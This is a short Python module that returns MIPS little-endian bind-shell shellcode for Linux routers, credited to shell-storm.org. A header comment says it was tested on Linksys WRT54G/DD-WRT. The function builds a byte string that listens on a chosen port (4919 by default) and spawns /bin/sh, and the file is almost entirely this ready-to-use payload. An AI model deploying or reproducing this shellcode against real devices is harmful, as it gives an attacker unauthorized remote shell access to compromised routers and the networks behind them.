#http://shell-storm.org/shellcode/files/shellcode-81.php

"""
/*	- MIPS little-endian
 *	- linux port listener 276 bytes shellcode
 *	- execve("/bin/sh",["/bin/sh"],[]);
 *	- port 0x1337 (4919)
 *	- tested on Linksys WRT54G/GL (DD-WRT Linux)
 *      - based on scut paper Writing MIPS/Irix shellcode
 *
 * 				vaicebine at gmail dot com
 */
"""
def tcp_bind( PORT):
	shellcode =  r"\xe0\xff\xbd\x27"
	shellcode += r"\xfd\xff\x0e\x24"
	shellcode += r"\x27\x20\xc0\x01"
	shellcode += r"\x27\x28\xc0\x01"
	shellcode += r"\xff\xff\x06\x28"
	shellcode += r"\x57\x10\x02\x24"
	shellcode += r"\x0c\x01\x01\x01"
	shellcode += r"\x50\x73\x0f\x24"
	shellcode += r"\xff\xff\x50\x30"
	shellcode += r"\xef\xff\x0e\x24"
	shellcode += r"\x27\x70\xc0\x01"
	shellcode += PORT
	shellcode += r"\x0d\x24"
	shellcode += r"\x04\x68\xcd\x01"
	shellcode += r"\xff\xfd\x0e\x24"
	shellcode += r"\x27\x70\xc0\x01"
	shellcode += r"\x25\x68\xae\x01"
	shellcode += r"\xe0\xff\xad\xaf"
	shellcode += r"\xe4\xff\xa0\xaf"
	shellcode += r"\xe8\xff\xa0\xaf"
	shellcode += r"\xec\xff\xa0\xaf"
	shellcode += r"\x25\x20\x10\x02"
	shellcode += r"\xef\xff\x0e\x24"
	shellcode += r"\x27\x30\xc0\x01"
	shellcode += r"\xe0\xff\xa5\x23"
	shellcode += r"\x49\x10\x02\x24"
	shellcode += r"\x0c\x01\x01\x01"
	shellcode += r"\x50\x73\x0f\x24"
	shellcode += r"\x25\x20\x10\x02"
	shellcode += r"\x01\x01\x05\x24"
	shellcode += r"\x4e\x10\x02\x24"
	shellcode += r"\x0c\x01\x01\x01"
	shellcode += r"\x50\x73\x0f\x24"
	shellcode += r"\x25\x20\x10\x02"
	shellcode += r"\xff\xff\x05\x28"
	shellcode += r"\xff\xff\x06\x28"
	shellcode += r"\x48\x10\x02\x24"
	shellcode += r"\x0c\x01\x01\x01"
	shellcode += r"\x50\x73\x0f\x24"
	shellcode += r"\xff\xff\x50\x30"
	shellcode += r"\x25\x20\x10\x02"
	shellcode += r"\xfd\xff\x0f\x24"
	shellcode += r"\x27\x28\xe0\x01"
	shellcode += r"\xdf\x0f\x02\x24"
	shellcode += r"\x0c\x01\x01\x01"
	shellcode += r"\x50\x73\x0f\x24"
	shellcode += r"\x25\x20\x10\x02"
	shellcode += r"\x01\x01\x05\x28"
	shellcode += r"\xdf\x0f\x02\x24"
	shellcode += r"\x0c\x01\x01\x01"
	shellcode += r"\x50\x73\x0f\x24"
	shellcode += r"\x25\x20\x10\x02"
	shellcode += r"\xff\xff\x05\x28"
	shellcode += r"\xdf\x0f\x02\x24"
	shellcode += r"\x0c\x01\x01\x01"
	shellcode += r"\x50\x73\x0f\x24"
	shellcode += r"\x50\x73\x06\x24"
	shellcode += r"\xff\xff\xd0\x04"
	shellcode += r"\x50\x73\x0f\x24"
	shellcode += r"\xff\xff\x06\x28"
	shellcode += r"\xdb\xff\x0f\x24"
	shellcode += r"\x27\x78\xe0\x01"
	shellcode += r"\x21\x20\xef\x03"
	shellcode += r"\xf0\xff\xa4\xaf"
	shellcode += r"\xf4\xff\xa0\xaf"
	shellcode += r"\xf0\xff\xa5\x23"
	shellcode += r"\xab\x0f\x02\x24"
	shellcode += r"\x0c\x01\x01\x01"
	#"/bin/sh";
	shellcode += r"\x2f\x62\x69\x6e\x2f\x73\x68"
	return shellcode



